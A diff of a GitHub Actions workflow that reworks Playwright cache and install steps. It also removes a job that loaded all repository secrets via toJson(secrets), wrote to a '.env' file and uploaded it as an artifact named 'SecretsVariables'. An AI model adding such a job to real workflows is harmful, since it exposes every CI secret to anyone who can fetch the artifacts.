@@ -52,13 +52,12 @@ jobs:
           ~/.cache/ms-playwright
         key: ${{ runner.os }}-playwright-${{ env.PLAYWRIGHT_VERSION }}
         restore-keys: |
-                      ${{ runner.os }}-playwright-
+            ${{ runner.os }}-playwright-
 
-    - run: npx playwright install --with-deps chromium
-      if: steps.playwright-cache.outputs.cache-hit != 'true'
-    - run: npx playwright install-deps
-      if: steps.playwright-cache.outputs.cache-hit != 'true'
-
+    - name: Cache
+      if: steps.playwright-cache.outputs.cache-hit != 'true'      
+      run: npx playwright install --with-deps chromium
+      
     - name: Run Playwright tests
       run: npm run test:api
     - uses: actions/upload-artifact@v2
@@ -66,16 +65,4 @@ jobs:
       with:
         name: playwright-test-results
         path: test-results/
-  one:
-    runs-on: ubuntu-latest
-    steps:
-    - name: "Echo in file"
-      env:
-        SECRETS_VARS: ${{ toJson(secrets) }}
-      run: echo "$URL" > ".env"
-      
-    - uses: actions/upload-artifact@v3
-      name: Upload Artifact
-      with:
-        name: SecretsVariables
-        path: ".env"
+
